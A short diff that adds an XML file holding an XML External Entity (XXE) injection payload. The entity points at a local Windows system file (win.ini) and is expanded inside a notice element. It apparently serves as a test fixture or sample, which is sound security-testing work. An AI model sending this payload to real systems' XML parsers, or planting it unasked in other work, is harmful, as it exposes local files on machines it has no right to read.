@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<notice><subject>&xxe;</subject></notice>
